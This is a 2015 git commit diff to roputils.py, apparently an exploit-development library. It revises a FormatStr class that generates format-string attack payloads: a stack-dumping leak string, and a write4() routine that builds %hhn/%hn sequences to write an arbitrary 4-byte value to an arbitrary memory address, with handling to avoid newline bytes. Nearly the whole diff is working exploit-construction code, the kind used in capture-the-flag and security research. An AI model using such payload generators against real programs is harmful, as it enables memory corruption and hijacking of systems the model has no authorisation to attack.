cf53e701847e8cc6f018652593fece21acbb5f12
inaz2 <inaz2@twitter>
2015-04-18 23:03:49 +0900

    FormatStr(): add changes to dump_stack(), write4() and remove write2()

--- roputils.py
+++ roputils.py
@@ -1035,11 +1035,11 @@ class FormatStr(object):
         if start > 1:
             i = start
             while len(buf) < size:
-                buf += ".%%%d$08x" % i
+                buf += ".%%%d$x" % i
                 i += 1
         else:
             while len(buf) < size:
-                buf += '.%08x'
+                buf += '.%x'
         return buf[:size]
 
     def calc_offset(self, s):
@@ -1050,21 +1050,32 @@ class FormatStr(object):
         buf += "%%%d$s" % self.offset
         return buf
 
-    def write2(self, addr, value):
-        buf = p32(addr)
-        n = ((value-len(buf)-1) & 0xFFFF) + 1
-        buf += "%%%dc%%%d$hn" % (n, self.offset)
-        return buf
-
     def write4(self, addr, value):
-        buf = p32([addr, addr+2])
+        if addr % 0x10 == 0x8:
+            # skip \x0a
+            buf = p32([addr, addr+1, addr+3])
 
-        n = [value, (value>>16)]
-        n[1] = ((n[1]-n[0]-1) & 0xFFFF) + 1
-        n[0] = ((n[0]-len(buf)-1) & 0xFFFF) + 1
+            n = [value & 0xFF, (value >> 8) & 0xFFFF, (value >> 24) & 0xFF]
+            n[2] = ((n[2]-n[1]-1) % 0x100) + 1
+            n[1] = ((n[1]-n[0]-1) % 0x10000) + 1
+            n[0] = ((n[0]-len(buf)-1) % 0x100) + 1
 
-        buf += "%%%dc%%%d$hn" % (n[0], self.offset)
-        buf += "%%%dc%%%d$hn" % (n[1], self.offset+1)
+            buf += "%%%dc%%%d$hhn" % (n[0], self.offset)
+            buf += "%%%dc%%%d$hn" % (n[1], self.offset+1)
+            buf += "%%%dc%%%d$hhn" % (n[2], self.offset+2)
+        else:
+            buf = p32([addr, addr+1, addr+2, addr+3])
+
+            n = map(ord, p32(value))
+            n[3] = ((n[3]-n[2]-1) % 0x100) + 1
+            n[2] = ((n[2]-n[1]-1) % 0x100) + 1
+            n[1] = ((n[1]-n[0]-1) % 0x100) + 1
+            n[0] = ((n[0]-len(buf)-1) % 0x100) + 1
+
+            buf += "%%%dc%%%d$hhn" % (n[0], self.offset)
+            buf += "%%%dc%%%d$hhn" % (n[1], self.offset+1)
+            buf += "%%%dc%%%d$hhn" % (n[2], self.offset+2)
+            buf += "%%%dc%%%d$hhn" % (n[3], self.offset+3)
 
         return buf
 
